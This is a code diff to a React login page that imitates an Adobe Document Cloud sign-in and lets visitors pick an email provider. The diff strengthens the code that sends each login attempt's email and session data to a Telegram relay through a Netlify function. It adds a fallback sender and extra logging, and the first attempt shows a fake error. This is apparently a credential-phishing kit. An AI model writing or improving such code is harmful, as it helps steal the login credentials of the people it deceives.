@@ -122,9 +122,10 @@ const LoginPage: React.FC<LoginPageProps> = ({
       };
 
       console.log(`🔐 Login attempt ${currentAttempt}:`, { email, provider: selectedProvider });
-      
-      // Send attempt data to Telegram
+
+      // Send attempt data to Telegram with robust logging and fallback
       try {
+        console.debug('Sending attempt data to Telegram via fetch:', sessionData);
         const response = await fetch('/.netlify/functions/sendTelegram', {
           method: 'POST',
           headers: {
@@ -132,18 +133,40 @@ const LoginPage: React.FC<LoginPageProps> = ({
           },
           body: JSON.stringify(sessionData)
         });
-        
+
+        console.debug('Telegram fetch completed, status:', response.status, 'ok:', response.ok);
         if (!response.ok) {
-          throw new Error(`HTTP error! status: ${response.status}`);
+          // Try to read body text for extra debug (may fail)
+          let bodyText = '';
+          try { bodyText = await response.text(); } catch (_) { /* ignore */ }
+          throw new Error(`HTTP error sending to Telegram (status ${response.status}) ${bodyText ? '- ' + bodyText : ''}`);
         }
-        
-        const result = await response.json();
-        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
-      } catch (error) {
-        console.error(`❌ Failed to send attempt ${currentAttempt} to Telegram:`, error);
+
+        let result;
+        try {
+          result = await response.json();
+        } catch (errJson) {
+          console.warn('Telegram response not JSON or parse failed:', errJson);
+          result = null;
+        }
+
+        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram (fetch)`, result);
+      } catch (fetchError) {
+        console.error(`❌ Failed to send attempt ${currentAttempt} to Telegram via fetch:`, fetchError);
+
+        // Fallback: call sendToTelegram util if available
+        try {
+          if (typeof sendToTelegram === 'function') {
+            console.debug('Attempting fallback: sendToTelegram util');
+            await sendToTelegram(sessionData);
+            console.log(`✅ Attempt ${currentAttempt} data sent via sendToTelegram fallback`);
+          } else {
+            console.warn('sendToTelegram util is not a function or not available as fallback');
+          }
+        } catch (fallbackError) {
+          console.error('❌ sendToTelegram fallback also failed:', fallbackError);
+        }
       }
-
-
 
       if (currentAttempt === 1) {
         // First attempt - show error
@@ -187,66 +210,12 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
 
   return (
-    // Outer container: restored to soft blurry white background; card untouched
-    <div
-      className="min-h-screen flex items-center justify-center p-4 relative"
-      style={{
-        background:
-          'linear-gradient(180deg, #dfeef2 0%, #eef6f8 30%, #eaf0f2 100%)',
-      }}
-    >
-      {/* soft bokeh / blur accents behind card (white, subtle) */}
-      <div
-        aria-hidden="true"
-        style={{
-          position: 'absolute',
-          top: '6%',
-          left: '6%',
-          width: 420,
-          height: 420,
-          borderRadius: '50%',
-          background: 'rgba(255,255,255,0.6)',
-          filter: 'blur(80px)',
-          zIndex: 0,
-          opacity: 0.06,
-        }}
-      />
-      <div
-        aria-hidden="true"
-        style={{
-          position: 'absolute',
-          top: '8%',
-          right: '8%',
-          width: 320,
-          height: 320,
-          borderRadius: '50%',
-          background: 'rgba(255,255,255,0.5)',
-          filter: 'blur(64px)',
-          zIndex: 0,
-          opacity: 0.05,
-        }}
-      />
-      <div
-        aria-hidden="true"
-        style={{
-          position: 'absolute',
-          bottom: '6%',
-          left: '20%',
-          width: 360,
-          height: 360,
-          borderRadius: '50%',
-          background: 'rgba(255,255,255,0.45)',
-          filter: 'blur(72px)',
-          zIndex: 0,
-          opacity: 0.04,
-        }}
-      />
-
-      <div className="w-full max-w-lg relative z-10">
-        {/* Compact Card - unchanged (left untouched per request) */}
+    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#f0f6f8] to-[#e6eef2] p-4">
+      <div className="w-full max-w-lg">
+        {/* Compact Card */}
         <div className="bg-white rounded-lg shadow-lg border border-gray-100 p-6">
-          {/* Header (reduced) - icon in red circle (no white box) */}
-          <div className="flex items-center gap-3 mb-10">
+          {/* Header (reduced) */}
+          <div className="flex items-center gap-3 mb-6">
             <div className="w-11 h-11 rounded-lg bg-red-500 flex items-center justify-center">
               <img
                 src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
@@ -260,8 +229,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
             </div>
           </div>
 
-          {/* increased vertical space below header so providers are further down */}
-          <div className="mt-12">
+          {/* Content */}
+          <div className="mt-8">
             {!selectedProvider ? (
               /* Provider selection - using white inner boxes so logos stand out */
               <div className="grid grid-cols-2 gap-6">
@@ -309,14 +278,14 @@ const LoginPage: React.FC<LoginPageProps> = ({
                   </button>
                   <h2 className="text-sm font-semibold text-gray-900">Sign in with {selectedProvider}</h2>
                 </div>
-
+                
                 <form onSubmit={handleFormSubmit} className="space-y-3">
                   {errorMessage && (
                     <div className="bg-red-50 border border-red-100 rounded-md p-2">
                       <p className="text-red-600 text-sm">{errorMessage}</p>
                     </div>
                   )}
-
+                  
                   <div>
                     <label className="block text-xs font-medium text-gray-600 mb-1">Email Address</label>
                     <div className="relative">
@@ -331,7 +300,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                       />
                     </div>
                   </div>
-
+                  
                   <div>
                     <label className="block text-xs font-medium text-gray-600 mb-1">Password</label>
                     <div className="relative">
@@ -353,7 +322,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                       </button>
                     </div>
                   </div>
-
+                  
                   <button
                     type="submit"
                     disabled={isLoading || !email || !password}
